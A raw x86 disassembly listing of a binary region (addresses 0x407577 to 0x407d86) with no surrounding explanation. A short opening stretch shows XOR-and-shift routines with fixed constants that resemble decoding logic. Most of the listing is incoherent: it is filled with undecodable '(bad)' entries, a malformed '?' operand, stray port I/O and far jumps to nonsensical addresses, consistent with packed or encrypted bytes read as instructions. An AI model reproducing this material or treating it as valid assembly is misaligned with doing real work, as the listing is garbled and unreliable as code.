  407577:	pop    ebp
  407578:	dec    ecx
  407579:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40757a:	fldcw  WORD PTR [ebx+0x50]
  40757d:	sahf   
  40757e:	lea    esp,[edi]
  407580:	daa    
  407581:	data16 jo 0x4075d7
  407584:	int3   
  407585:	mov    eax,ds:0x37d580b8
  40758a:	pop    eax
  40758b:	cmc    
  40758c:	jmp    0x4075ad
  40758e:	fbld   TBYTE PTR [eax-0x1b]
  407591:	mov    ecx,DWORD PTR [ebp-0x4c]
  407594:	shrd   eax,ecx,0x2
  407598:	shr    ecx,0x2
  40759b:	mov    cx,ax
  40759e:	mov    eax,DWORD PTR [ebp-0x50]
  4075a1:	mov    edx,0x695d
  4075a6:	xor    cx,dx
  4075a9:	mov    edx,DWORD PTR [ebp-0x4c]
  4075ac:	xor    edx,edx
  4075ae:	shl    eax,0x1e
  4075b1:	mov    ax,dx
  4075b4:	or     ax,cx
  4075b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4075ba:	cmp    WORD PTR [ecx],ax
  4075bd:	je     0x407e12
  4075c3:	mov    eax,DWORD PTR [ebp+0x14]
  4075c6:	sub    DWORD PTR [ebp-0x4],eax
  4075c9:	mov    ecx,DWORD PTR [ebx]
  4075cb:	mov    eax,DWORD PTR [ebx+0x4]
  4075ce:	xor    eax,0x9c1b89e8
  4075d3:	xor    ecx,0xca79a577
  4075d9:	shrd   ecx,eax,0x2
  4075dd:	shr    eax,0x2
  4075e0:	mov    DWORD PTR [ebp-0x64],eax
  4075e3:	mov    eax,DWORD PTR [ebx]
  4075e5:	mov    edx,DWORD PTR [ebx+0x4]
  4075e8:	mov    edx,eax
  4075ea:	xor    eax,eax
  4075ec:	or     eax,ecx
  4075ee:	mov    DWORD PTR [ebp-0x70],eax
  4075f1:	mov    eax,DWORD PTR [esi]
  4075f3:	mov    ecx,DWORD PTR [esi+0x4]
  4075f6:	xor    ecx,0x9c1b89e8
  4075fc:	xor    eax,0xca79a577
  407601:	jmp    0x4079df
  407606:	mov    dl,0x68
  407608:	jg     0x407620
  40760a:	cmp    ebp,edi
  40760c:	sbb    ah,BYTE PTR [ecx+eax*1]
  40760f:	or     al,0x81
  407611:	mov    al,0x51
  407613:	xor    esp,0x6a
  407616:	pop    ss
  407617:	jge    0x407631
  407619:	sbb    BYTE PTR [esi-0x60e7e7ee],bl
  40761f:	mov    dl,0x7b
  407621:	sub    BYTE PTR ds:0x8821a627,ch
  407627:	lock lea ebp,[esi+0x6ba0384c]
  40762e:	and    ah,BYTE PTR [ebx+0xf]
  407631:	or     esi,DWORD PTR [edi]
  407633:	hlt    
  407634:	mov    dl,0x7a
  407636:	push   esi
  407637:	shl    BYTE PTR [eax-0x5933c8db],cl
  40763d:	std    
  40763e:	scas   eax,DWORD PTR es:[edi]
  40763f:	push   0xffffff8e
  407641:	cmp    cl,ah
  407643:	and    eax,0xd036435d
  407648:	jne    0x4076a6
  40764a:	retf   
  40764b:	js     0x407631
  40764d:	sbb    eax,0x358cf636
  407652:	retf   0x8891
  407655:	dec    eax
  407656:	es fld st(3)
  407659:	rol    DWORD PTR [edi-0x28],cl
  40765c:	xchg   ecx,eax
  40765d:	mov    WORD PTR ds:0xd908ea35,gs
  407663:	sbb    BYTE PTR [edx],bl
  407665:	retf   
  407666:	push   eax
  407667:	xchg   edi,eax
  407668:	push   esi
  407669:	mov    ebx,0x355bb909
  40766e:	jg     0x407617
  407670:	cs test ebx,ebp
  407673:	iret   
  407674:	mov    eax,0x1bb063d1
  407679:	jns    0x407639
  40767b:	xor    dl,BYTE PTR [eax+edx*2+0x2f]
  40767f:	add    al,0xac
  407681:	int3   
  407682:	ins    BYTE PTR es:[edi],dx
  407683:	and    BYTE PTR [eax+0x72],cl
  407686:	aas    
  407687:	xor    eax,0x49636520
  40768c:	mov    WORD PTR [edx+0x70],fs
  40768f:	jg     0x40762d
  407691:	outs   dx,DWORD PTR ds:[esi]
  407692:	mov    al,ds:0x5933071b
  407697:	aas    
  407698:	and    DWORD PTR [eax+0x69],ebx
  40769b:	push   ebx
  40769c:	aad    0x6b
  40769e:	mov    ah,0xd
  4076a0:	cs jne 0x40765d
  4076a3:	(bad)  [ebx+0x5a5ec6bc]
  4076a9:	ins    BYTE PTR es:[edi],dx
  4076aa:	dec    ecx
  4076ab:	xor    dl,BYTE PTR [eax-0x4c3b5cb2]
  4076b1:	mov    BYTE PTR [edi+esi*4+0x57],bh
  4076b5:	adc    edi,ebx
  4076b7:	jmp    0xa01a:0x3fa105ef
  4076be:	dec    edx
  4076bf:	push   ecx
  4076c0:	enter  0x8bfa,0x98
  4076c4:	mov    esp,0xf785eb77
  4076c9:	add    BYTE PTR [edi],bh
  4076cb:	add    eax,0x1edabe56
  4076d0:	inc    ebp
  4076d1:	adc    edi,DWORD PTR [ebp-0x7f]
  4076d4:	data16 gs cli 
  4076d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076d8:	jge    0x407726
  4076da:	retf   0x6890
  4076dd:	xchg   al,dl
  4076df:	scas   eax,DWORD PTR es:[edi]
  4076e0:	dec    esp
  4076e1:	sbb    ecx,ebp
  4076e3:	in     al,0xdc
  4076e5:	sar    DWORD PTR [eax+0x11],0xb7
  4076e9:	inc    esp
  4076ea:	jb     0x40775f
  4076ec:	shl    DWORD PTR [ecx-0x37],1
  4076ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076f0:	enter  0x8cb9,0x31
  4076f4:	mov    dh,0x68
  4076f6:	xchg   esi,eax
  4076f7:	lock jmp 0xaf681494
  4076fd:	loope  0x407724
  4076ff:	xor    al,0x72
  407701:	dec    ebx
  407702:	in     al,0x6f
  407704:	stos   DWORD PTR es:[edi],eax
  407705:	jecxz  0x4076ad
  407707:	and    BYTE PTR [edi-0x34],bh
  40770a:	pop    ebx
  40770b:	xchg   BYTE PTR [edx+0x18f7859b],ah
  407711:	cmp    BYTE PTR [ebx],0xfe
  407714:	arpl   si,ax
  407716:	stos   DWORD PTR es:[edi],eax
  407717:	pop    ebp
  407718:	xor    dl,BYTE PTR [esi+esi*2+0x636dc577]
  40771f:	ins    DWORD PTR es:[edi],dx
  407720:	fisubr WORD PTR [edi+0x3a70f96f]
  407726:	xchg   ecx,eax
  407728:	or     dh,cl
  40772a:	fcom   DWORD PTR [esi+ecx*8]
  40772d:	inc    esi
  40772e:	push   ebx
  40772f:	pushf  
  407730:	ins    BYTE PTR es:[edi],dx
  407731:	mov    ah,0x2b
  407733:	cld    
  407734:	ret    0x75fc
  407737:	jmp    DWORD PTR [eax+0x23af4812]
  40773d:	inc    edi
  40773e:	mov    bh,0x2
  407740:	test   DWORD PTR [eax],edx
  407742:	ret    
  407743:	into   
  407744:	mov    al,ds:0xdb71130a
  407749:	mov    ch,0xf1
  40774b:	jmp    0x7fb0:0x14920b7
  407752:	adc    eax,ecx
  407754:	scas   al,BYTE PTR es:[edi]
  407755:	cmp    al,0x30
  407757:	fs push ds
  407759:	push   0xffffff89
  40775b:	mov    esi,0xfc716979
  407760:	(bad)  
  407761:	pop    ebx
  407762:	add    esi,ebx
  407764:	mov    esi,0x87c5d0e9
  407769:	jl     0x4076fe
  40776b:	popa   
  40776c:	std    
  40776d:	and    DWORD PTR [edx],esp
  40776f:	js     0x40771f
  407771:	and    eax,0xa7243adb
  407776:	repnz call 0x2a2:0xa3c05af0
  40777e:	sbb    al,0xb0
  407780:	mov    al,0xff
  407782:	sub    BYTE PTR [edi],0xb1
  407785:	mov    ecx,0xb7b91c9a
  40778a:	push   ebx
  40778b:	in     eax,0x80
  40778d:	aad    0xbb
  40778f:	or     ah,BYTE PTR [ecx]
  407791:	stos   DWORD PTR es:[edi],eax
  407792:	mov    edi,0xfe9666d
  407797:	mov    eax,0x877f8db4
  40779c:	mov    ds:0x1daac666,al
  4077a1:	cmp    dl,BYTE PTR [edi]
  4077a3:	fst    DWORD PTR ds:0xc8804e73
  4077a9:	or     esp,DWORD PTR [edx]
  4077ab:	jle    0x407756
  4077ad:	(bad)  
  4077af:	adc    ebp,DWORD PTR [ecx+0x2ab5e456]
  4077b5:	cmp    cl,BYTE PTR [edx+0x6d]
  4077b8:	call   0xfa8f8aa0
  4077bd:	push   0x47
  4077bf:	call   FWORD PTR [ebx]
  4077c1:	ret    0xcd76
  4077c4:	imul   ecx,DWORD PTR [edi+0x7486b120],0xffffffc0
  4077cb:	dec    ebx
  4077cc:	movzx  eax,si
  4077cf:	jmp    0x1f12:0x4dab8dc
  4077d6:	pop    ss
  4077d7:	lods   al,BYTE PTR ds:[esi]
  4077d8:	mov    cl,0xb6
  4077da:	adc    edx,DWORD PTR [eax+0x4d057c04]
  4077e0:	adc    cl,dl
  4077e2:	rcr    DWORD PTR [eax+0x295aab78],0x95
  4077e9:	rol    ch,1
  4077eb:	pusha  
  4077ec:	rol    DWORD PTR [eax-0x80e882e],0xcf
  4077f3:	call   0x1deb52b8
  4077f8:	and    DWORD PTR [ebp-0x1d],0x9
  4077fc:	add    esi,DWORD PTR ds:0x867e2c73
  407802:	push   ss
  407803:	in     eax,dx
  407804:	cmc    
  407805:	lock sub ah,BYTE PTR [ebx+0x61f010a7]
  40780c:	retf   
  40780d:	mov    esp,edx
  40780f:	cld    
  407810:	ja     0x40779f
  407812:	bound  ebx,QWORD PTR [eax-0x2a]
  407815:	push   ebx
  407816:	pop    eax
  407817:	shr    BYTE PTR [ecx+edx*1],cl
  40781a:	xchg   esi,eax
  40781b:	lea    esi,[ecx-0x2c8ca5e4]
  407821:	add    eax,0x36b9d812
  407826:	pop    ds
  407827:	and    edi,DWORD PTR [ecx-0x1c]
  40782a:	stos   DWORD PTR es:[edi],eax
  40782b:	inc    ebx
  40782c:	imul   esp,esi,0x9
  40782f:	sub    edi,0xbb423793
  407835:	adc    dl,0xed
  407838:	mov    ah,0xf0
  40783a:	in     eax,0x30
  40783c:	and    eax,0xc10b9258
  407841:	sbb    BYTE PTR [edi],dl
  407843:	inc    esi
  407844:	pop    ebp
  407845:	push   ss
  407846:	inc    ebx
  407847:	fild   WORD PTR [esi]
  407849:	jge    0x407868
  40784b:	add    al,BYTE PTR [esi-0xf]
  40784e:	mov    BYTE PTR [edx],bh
  407850:	popa   
  407851:	stos   BYTE PTR es:[edi],al
  407852:	in     al,dx
  407853:	test   BYTE PTR [edx+0x1174408d],bl
  407859:	sub    DWORD PTR [esi+0x11de6a1b],ebp
  40785f:	(bad)
  407862:	scas   al,BYTE PTR es:[edi]
  407863:	stos   DWORD PTR es:[edi],eax
  407864:	cmp    BYTE PTR [esi+0x1d4e521f],dl
  40786a:	fs jbe 0x407826
  40786d:	aaa    
  40786e:	xchg   BYTE PTR [esi],dh
  407870:	dec    edi
  407871:	sahf   
  407872:	out    dx,al
  407873:	mov    esp,0x3c39dd69
  407878:	push   edx
  407879:	mov    al,ds:0xcf6e9bbb
  40787e:	inc    edi
  40787f:	ret    0x8789
  407882:	adc    DWORD PTR [edi-0x641d562b],ecx
  407888:	dec    ebp
  407889:	inc    ebp
  40788a:	inc    edi
  40788b:	adc    DWORD PTR [esi+ecx*4],ebp
  40788e:	int    0xc3
  407890:	les    eax,FWORD PTR [edi-0x33]
  407893:	jbe    0x407892
  407895:	sbb    esi,ebx
  407897:	stos   BYTE PTR es:[edi],al
  407898:	je     0x40785e
  40789a:	clc    
  40789b:	sbb    DWORD PTR ds:[edi-0x61c1e1c7],0xffffffc2
  4078a3:	imul   esp,DWORD PTR [ecx+0x5e6ff1cb],0xbb063043
  4078ad:	inc    ebp
  4078ae:	mov    esp,0xc1383cc9
  4078b3:	test   al,0x5b
  4078b5:	add    edx,ebx
  4078b7:	popa   
  4078b8:	lea    eax,[edi]
  4078ba:	dec    ebp
  4078bb:	test   dh,0x56
  4078be:	jmp    0x69db371d
  4078c3:	mov    edx,0x58003b80
  4078c8:	imul   esi,DWORD PTR [edi+0x2273fa0e],0x6c27658
  4078d2:	mov    cl,0xc9
  4078d4:	xor    edi,esi
  4078d6:	xor    ch,al
  4078d8:	mov    esi,0x73c2ac05
  4078dd:	into   
  4078de:	(bad)  
  4078df:	mov    edx,0xe31ba4c8
  4078e4:	shr    DWORD PTR [edx+ebp*2+0x70],cl
  4078e8:	pushf  
  4078e9:	test   eax,0xa760c4ad
  4078ee:	xchg   DWORD PTR [ecx],ebx
  4078f0:	add    BYTE PTR [edx],ch
  4078f2:	push   edx
  4078f3:	mov    ebx,0x554796c7
  4078f8:	mov    ecx,0x93c45611
  4078fd:	in     eax,0x54
  4078ff:	mov    esi,ebx
  407901:	imul   BYTE PTR [eax]
  407903:	push   edx
  407904:	mov    dl,0x56
  407906:	lahf   
  407907:	rol    cl,cl
  407909:	sub    eax,0xa79733d7
  40790e:	out    0x44,al
  407910:	mov    cl,0x52
  407912:	(bad)  
  407913:	jmp    0x4078b9
  407915:	cwde   
  407916:	pusha  
  407917:	mov    cl,0x5b
  407919:	aad    0xf0
  40791b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40791c:	pop    eax
  40791d:	mov    bh,0x9c
  40791f:	push   ss
  407920:	mov    bl,0x11
  407922:	push   eax
  407923:	cwde   
  407924:	sar    BYTE PTR [edi-0x5b3b1fbc],1
  40792a:	xchg   ebp,eax
  40792b:	inc    ebp
  40792c:	scas   al,BYTE PTR es:[edi]
  40792d:	mov    dl,0xc7
  40792f:	mov    dh,0x23
  407931:	inc    esp
  407932:	fidivr DWORD PTR [edi+0x1e3fd69b]
  407938:	test   eax,0x8a8c50c5
  40793d:	xchg   DWORD PTR [ecx*1+0x34d5da0],ebp
  407944:	mov    ?,WORD PTR [edx-0xa]
  407947:	pop    ss
  407948:	sbb    DWORD PTR [edx],eax
  40794a:	push   ebp
  40794b:	push   ebp
  40794c:	or     eax,DWORD PTR [ebx+ebx*1-0x3ad1f96e]
  407953:	hlt    
  407954:	pusha  
  407955:	shr    DWORD PTR es:[ecx+0x43],1
  407959:	push   cs
  40795a:	push   edi
  40795b:	mov    edi,DWORD PTR [edi+edx*1]
  40795e:	jmp    0xb011:0x96f0586f
  407965:	mov    ah,0x45
  407967:	mov    al,BYTE PTR [esi-0x70b36082]
  40796d:	cmp    BYTE PTR [ebx+0x15ecc8ef],ah
  407973:	hlt    
  407974:	rcl    BYTE PTR [edx+ebp*4+0x2c4d66fe],0x6c
  40797c:	mov    al,ds:0xc2db3c58
  407981:	ja     0x4079b5
  407983:	iret   
  407984:	clc    
  407985:	jmp    0xad755b1b
  40798a:	sub    DWORD PTR [ebx],ebx
  40798c:	and    ch,cl
  40798e:	push   0xffffff8d
  407990:	fs test al,0x7f
  407993:	dec    eax
  407994:	icebp  
  407995:	pop    es
  407996:	ror    DWORD PTR [ebx],0x1c
  407999:	das    
  40799a:	sub    BYTE PTR [esi+0x12],0xdf
  40799e:	xor    BYTE PTR [ebx+0x5edf78de],dl
  4079a4:	xchg   BYTE PTR [ebx+0x47fcb919],ch
  4079aa:	leave  
  4079ab:	inc    esp
  4079ac:	into   
  4079ad:	sti    
  4079ae:	push   es
  4079af:	mov    DWORD PTR [ebx+0x6bc8707d],ecx
  4079b5:	pop    eax
  4079b6:	jg     0x407944
  4079b8:	(bad)  
  4079b9:	sub    DWORD PTR [ecx+esi*2+0x3],ebx
  4079bd:	jg     0x4079f0
  4079bf:	inc    eax
  4079c0:	push   ds
  4079c1:	cmp    ch,BYTE PTR [esi]
  4079c3:	ret    
  4079c4:	mov    esp,0xfa3654e1
  4079c9:	push   esi
  4079ca:	pusha  
  4079cb:	in     eax,0x10
  4079cd:	and    BYTE PTR [edi],al
  4079cf:	repnz fimul WORD PTR [ecx+eiz*8-0x1e]
  4079d4:	and    eax,0x550864d4
  4079d9:	mov    ecx,0xdb0c6e2b
  4079de:	pop    esp
  4079df:	mov    DWORD PTR [ebp-0x34],eax
  4079e2:	jmp    0x407dc0
  4079e7:	repnz jecxz 0x407a47
  4079ea:	jmp    0x407a49
  4079ec:	imul   esp,DWORD PTR [ebx-0x25],0xffffffa9
  4079f0:	pushf  
  4079f1:	pop    ds
  4079f2:	jle    0x4079ea
  4079f4:	shr    DWORD PTR [ecx],0xaa
  4079f7:	popf   
  4079f8:	jne    0x407a12
  4079fa:	sbb    BYTE PTR [esi+0x48181812],bl
  407a00:	mov    ebp,0xa98f274c
  407a05:	jp     0x407a62
  407a07:	test   esp,ebp
  407a09:	inc    ebx
  407a0a:	ret    
  407a0b:	test   DWORD PTR [ebp+0x382944e8],ebp
  407a11:	inc    eax
  407a12:	sub    bh,BYTE PTR [esi]
  407a14:	mov    dl,0x62
  407a16:	sbb    al,0xf5
  407a18:	mov    bh,ah
  407a1a:	gs adc esp,ebp
  407a1d:	cwde   
  407a1e:	push   esp
  407a1f:	or     eax,esi
  407a21:	mov    BYTE PTR [esp+edx*4],bh
  407a24:	dec    esp
  407a25:	adc    DWORD PTR [edx+0x4a412e4c],0x13b09bad
  407a2f:	push   esi
  407a30:	xchg   esi,eax
  407a31:	add    esp,DWORD PTR [edi]
  407a33:	jge    0x407a7e
  407a35:	xchg   edx,eax
  407a36:	mov    dl,BYTE PTR [ebx+0x4532977b]
  407a3c:	or     DWORD PTR [edx-0x2],0x2640eb3a
  407a43:	in     al,0xd3
  407a45:	jae    0x4079fe
  407a47:	std    
  407a48:	add    BYTE PTR [edi+0x66],0x1b
  407a4c:	arpl   WORD PTR [ebp+0x67b38853],dx
  407a52:	mov    ch,0xcb
  407a54:	mov    ebx,0xb23d1bbc
  407a59:	mov    eax,ds:0xc08ff1bd
  407a5e:	(bad)  
  407a5f:	pushf  
  407a60:	ret    
  407a61:	icebp  
  407a62:	in     al,0xe9
  407a64:	mov    ah,0x33
  407a66:	and    DWORD PTR [ebx-0x27],edi
  407a69:	push   ebp
  407a6a:	pop    edi
  407a6b:	cwde   
  407a6c:	jp     0x407a3a
  407a6e:	push   ds
  407a6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a70:	test   ebx,0xd96ed10a
  407a76:	es jp  0x407aa8
  407a79:	nop
  407a7a:	psubd  mm0,QWORD PTR [eax+0x1fbc9255]
  407a81:	xchg   BYTE PTR [esi+0x553a98a3],ah
  407a87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a88:	cmp    al,0xf7
  407a8a:	xor    DWORD PTR [edx-0x3f9c6235],ebp
  407a90:	jge    0x407afd
  407a92:	and    BYTE PTR [edx],0x61
  407a95:	mov    ds:0x43dad064,al
  407a9a:	leave  
  407a9b:	push   edi
  407a9c:	sahf   
  407a9d:	aad    0x1c
  407a9f:	pop    eax
  407aa0:	stos   BYTE PTR es:[edi],al
  407aa1:	dec    esi
  407aa2:	adc    al,0x1b
  407aa4:	or     eax,0xe1ad4f01
  407aa9:	dec    eax
  407aaa:	icebp  
  407aab:	jecxz  0x407af2
  407aad:	xlat   BYTE PTR ds:[ebx]
  407aae:	sti    
  407aaf:	mov    esi,0x6f0ff186
  407ab4:	inc    ebx
  407ab5:	iret   
  407ab6:	loop   0x407ae1
  407ab8:	dec    eax
  407ab9:	ret    0x9b0
  407abc:	mov    ebx,0x1d0922b9
  407ac1:	rcl    BYTE PTR [ecx],0xd3
  407ac4:	aad    0xda
  407ac6:	stos   DWORD PTR es:[edi],eax
  407ac7:	inc    DWORD PTR [esp+edx*2-0x6c]
  407acb:	aad    0x5
  407acd:	and    eax,ebp
  407acf:	push   esi
  407ad0:	cwde   
  407ad1:	imul   eax,esi,0xffffff90
  407ad4:	sub    esp,DWORD PTR [esi-0x4]
  407ad7:	call   0x48c5:0x577140e0
  407ade:	pop    ebx
  407adf:	mov    WORD PTR [ecx],es
  407ae1:	fnsave [ebx]
  407ae3:	or     eax,0xc903f8f
  407ae8:	ja     0x407ad9
  407aea:	leave  
  407aeb:	ds test al,0xd9
  407aee:	sbb    al,0xa0
  407af0:	xlat   BYTE PTR ds:[ebx]
  407af1:	or     eax,0x6d1df7da
  407af6:	cli    
  407af7:	loop   0x407a7b
  407af9:	mov    edx,0xb5f5543a
  407afe:	cmp    BYTE PTR [edx],0xb2
  407b01:	and    al,0x2d
  407b03:	mov    esi,DWORD PTR [ebx-0x6188d989]
  407b09:	(bad)  
  407b0a:	pop    ecx
  407b0b:	sub    al,0xa
  407b0d:	mov    bl,0x44
  407b0f:	or     DWORD PTR [edx],esi
  407b11:	push   ds
  407b12:	inc    esp
  407b13:	dec    ebx
  407b14:	out    dx,al
  407b15:	jne    0x407ac9
  407b17:	popa   
  407b18:	mov    ch,0x7d
  407b1a:	mov    ds:0xae4f1c1f,al
  407b1f:	cmp    bh,BYTE PTR [ecx]
  407b21:	inc    ecx
  407b22:	jmp    0x971948ad
  407b27:	push   ecx
  407b28:	push   ecx
  407b29:	ret    
  407b2a:	or     al,0xa7
  407b2c:	add    DWORD PTR [ecx],edi
  407b2e:	jns    0x407b64
  407b30:	jno    0x407b3b
  407b32:	and    eax,0x1131d78
  407b37:	mov    BYTE PTR [eax-0x21],al
  407b3a:	dec    esp
  407b3b:	xchg   edx,eax
  407b3c:	mov    fs,WORD PTR [ebp-0x71]
  407b3f:	cs pop edi
  407b41:	fadd   QWORD PTR [esi+0x39e8418e]
  407b47:	(bad)  
  407b48:	pop    esi
  407b49:	xor    al,0x73
  407b4b:	nop
  407b4c:	sub    al,0x9
  407b4e:	jbe    0x407b7d
  407b50:	mov    ecx,0x4132cd71
  407b55:	inc    ebp
  407b56:	dec    eax
  407b57:	xlat   BYTE PTR ds:[ebx]
  407b58:	jnp    0x407b78
  407b5a:	xor    eax,0x684c6143
  407b5f:	and    esp,DWORD PTR [ebx+0x197490e7]
  407b65:	in     eax,dx
  407b66:	daa    
  407b67:	arpl   WORD PTR [ebx-0x49],bx
  407b6a:	iret   
  407b6b:	and    BYTE PTR [ebx-0x79],al
  407b6e:	pop    es
  407b6f:	jnp    0x407b98
  407b71:	inc    esi
  407b72:	mov    esi,0xa98ebe76
  407b77:	loop   0x407b33
  407b79:	push   edx
  407b7a:	int    0x34
  407b7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b7d:	sbb    al,0xca
  407b7f:	daa    
  407b80:	popf   
  407b81:	mov    es,esp
  407b83:	push   esp
  407b84:	jg     0x407b4f
  407b86:	mov    cl,0x4c
  407b88:	pop    ds
  407b89:	call   0x9a31147b
  407b8e:	aaa    
  407b8f:	shl    DWORD PTR [esp+ecx*8],0x55
  407b93:	dec    esi
  407b94:	div    BYTE PTR [ecx-0x5a35566a]
  407b9a:	test   BYTE PTR [edi-0x45673748],cl
  407ba0:	pop    ebx
  407ba1:	adc    DWORD PTR [esi-0x14604bb7],0x96566f1f
  407bab:	(bad)  
  407bac:	in     al,dx
  407bad:	lods   al,BYTE PTR fs:[esi]
  407baf:	lods   eax,DWORD PTR ds:[esi]
  407bb0:	or     DWORD PTR [esp+edx*8+0x1be921f2],edi
  407bb7:	loop   0x407bee
  407bb9:	rcr    BYTE PTR [ecx-0x3d617b9],1
  407bbf:	pop    ecx
  407bc0:	add    al,0x33
  407bc2:	inc    edx
  407bc3:	mov    ch,0xe9
  407bc5:	mov    eax,0xbe5a0497
  407bca:	or     edi,ebp
  407bcc:	mov    dl,0xf6
  407bce:	cld    
  407bcf:	inc    ebp
  407bd0:	push   ebp
  407bd1:	cdq    
  407bd2:	push   es
  407bd3:	adc    DWORD PTR [ebx+0x3e],edx
  407bd6:	adc    edi,DWORD PTR [ebx+0x19]
  407bd9:	add    cl,0xf
  407bdc:	cmp    eax,0x5bd8840a
  407be1:	aaa    
  407be2:	and    eax,0xfefcd71b
  407be7:	cmp    ebx,DWORD PTR [ecx+0x5863ed61]
  407bed:	dec    ebp
  407bee:	pop    esp
  407bef:	sbb    dl,BYTE PTR [ecx-0x6b93118]
  407bf5:	dec    edi
  407bf6:	sub    al,0x68
  407bf8:	sub    BYTE PTR [esi-0x1af2ce1],bh
  407bfe:	cmp    al,0xe
  407c00:	inc    DWORD PTR [esi]
  407c02:	data16 (bad) 
  407c04:	jmp    0x88fd0e6
  407c09:	into   
  407c0a:	fld    TBYTE PTR [ebx-0x27f9704e]
  407c10:	shl    bl,1
  407c12:	pop    ds
  407c13:	aas    
  407c14:	addr16 leave 
  407c16:	xchg   ecx,eax
  407c17:	sbb    al,0x4
  407c19:	sbb    al,0xd2
  407c1b:	popw   ss
  407c1d:	test   BYTE PTR [ebp-0x28],dl
  407c20:	repz mov ebx,0x3c58447
  407c26:	push   ds
  407c27:	fcmovbe st,st(1)
  407c29:	in     eax,0x87
  407c2b:	ins    DWORD PTR es:[edi],dx
  407c2c:	cmp    DWORD PTR [esi+esi*1-0x10],ecx
  407c30:	rcr    DWORD PTR [esi+0x52],0x9c
  407c34:	icebp  
  407c35:	mov    bl,0xfd
  407c37:	cli    
  407c38:	loopne 0x407ca4
  407c3a:	xor    ah,bl
  407c3c:	fisub  DWORD PTR [eax+0x1179d2c9]
  407c42:	sub    eax,DWORD PTR [ecx-0x650e6ad3]
  407c48:	xor    edi,DWORD PTR ds:0xb929e052
  407c4e:	sbb    eax,0xf3969207
  407c53:	(bad)  
  407c54:	call   0x240f70a2
  407c59:	xor    esp,edx
  407c5b:	jg     0x407cdb
  407c5d:	(bad)  
  407c5f:	dec    edi
  407c60:	fucompp 
  407c62:	lock and DWORD PTR [ebx-0x56c03362],esi
  407c69:	retf   0xc8f6
  407c6c:	inc    esp
  407c6d:	call   0x3ca2ce78
  407c72:	in     eax,dx
  407c73:	mov    ds:0x1382cbc7,eax
  407c78:	cmp    DWORD PTR [esi+0x588c3b8a],esp
  407c7e:	stos   BYTE PTR es:[edi],al
  407c7f:	scas   eax,DWORD PTR es:[edi]
  407c80:	xor    DWORD PTR [eax-0x64d4eaa4],edi
  407c86:	loope  0x407c50
  407c88:	clc    
  407c89:	imul   edx,DWORD PTR [edx+0x55],0x25e23cf4
  407c90:	out    dx,al
  407c91:	mul    BYTE PTR [esi-0x1a]
  407c94:	icebp  
  407c95:	push   ebp
  407c96:	adc    al,0x8d
  407c98:	mov    esi,0xfe84fc11
  407c9d:	jae    0x407ce6
  407c9f:	sub    DWORD PTR [edx],eax
  407ca1:	fcom   QWORD PTR [edi-0x75]
  407ca4:	fisub  WORD PTR [esi]
  407ca6:	aad    0x20
  407ca8:	jmp    0x6a7204e7
  407cad:	jmp    FWORD PTR [eax-0x79]
  407cb0:	pop    ds
  407cb1:	stos   BYTE PTR es:[edi],al
  407cb2:	mov    cl,0xa7
  407cb4:	shr    BYTE PTR [edx-0x51],cl
  407cb7:	bound  ebp,QWORD PTR [esp+eax*8-0x76a27918]
  407cbe:	fdivr  DWORD PTR ds:[ebx-0x11]
  407cc2:	jl     0x407cc2
  407cc4:	fsub   st,st(6)
  407cc6:	sub    DWORD PTR [ecx-0x5c1adc51],0xdd37a268
  407cd0:	pop    esp
  407cd1:	in     al,0x9a
  407cd3:	dec    esi
  407cd4:	pop    ds
  407cd5:	stc    
  407cd6:	sbb    DWORD PTR [esi+0x65e384b8],eax
  407cdc:	jnp    0x407d21
  407cde:	or     BYTE PTR [ecx-0xa],dl
  407ce1:	aam    0x71
  407ce3:	rol    bl,1
  407ce5:	nop
  407ce6:	jl     0x407c69
  407ce8:	data16 cmp dh,bh
  407ceb:	dec    esi
  407cec:	pop    ecx
  407ced:	out    0xe7,al
  407cef:	popf   
  407cf0:	pcmpeqd mm6,QWORD PTR [ecx+0x1783a819]
  407cf7:	push   ds
  407cf8:	call   0x9c4e199c
  407cfd:	test   BYTE PTR [ebp-0xe2b693a],bh
  407d03:	pop    esi
  407d04:	sbb    eax,0xa4673ab1
  407d09:	bound  ebx,QWORD PTR [ebx+edi*4]
  407d0c:	rol    edi,1
  407d0e:	scas   al,BYTE PTR es:[edi]
  407d0f:	ins    BYTE PTR es:[edi],dx
  407d10:	push   ecx
  407d11:	(bad)  
  407d12:	push   eax
  407d13:	and    eax,0x70a662a9
  407d18:	pop    ds
  407d19:	mov    cl,0x1f
  407d1b:	retf   0x60b8
  407d1e:	out    dx,al
  407d1f:	lahf   
  407d20:	inc    ebx
  407d21:	push   eax
  407d22:	inc    ecx
  407d23:	mov    dh,0x68
  407d25:	out    0x49,eax
  407d27:	int3   
  407d28:	mov    eax,0x3516058b
  407d2d:	pop    ebx
  407d2e:	fcmovne st,st(0)
  407d30:	xchg   esp,eax
  407d31:	sbb    ebp,esi
  407d33:	cmp    DWORD PTR [ebp+0x35583206],esp
  407d39:	out    dx,al
  407d3a:	fwait
  407d3b:	stos   DWORD PTR es:[edi],eax
  407d3c:	pop    edi
  407d3d:	mov    ds:0x8570a8c3,eax
  407d42:	mov    si,0xedb7
  407d46:	out    dx,eax
  407d47:	jmp    0x407d89
  407d49:	or     ecx,edi
  407d4b:	mov    ah,0x99
  407d4d:	leave  
  407d4e:	mov    al,ds:0x96e3fcfc
  407d53:	lahf   
  407d54:	(bad)  
  407d55:	xchg   edx,eax
  407d56:	stos   DWORD PTR es:[edi],eax
  407d57:	mov    edx,0x86bf7433
  407d5c:	mov    bh,0xe0
  407d5e:	dec    edi
  407d5f:	push   esi
  407d60:	push   esi
  407d61:	fistp  QWORD PTR [ebx-0x70]
  407d64:	adc    esp,0x8c062841
  407d6a:	fs xchg ebx,eax
  407d6c:	sahf   
  407d6d:	sub    edx,ecx
  407d6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d70:	jmp    0x1e9813a2
  407d75:	mov    eax,0x919ebb1e
  407d7a:	rcl    DWORD PTR [ecx-0x6a],cl
  407d7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d7e:	rcr    DWORD PTR [esi+0x8ff4239],0xd3
  407d85:	popa   
  407d86:	js     0x407d78
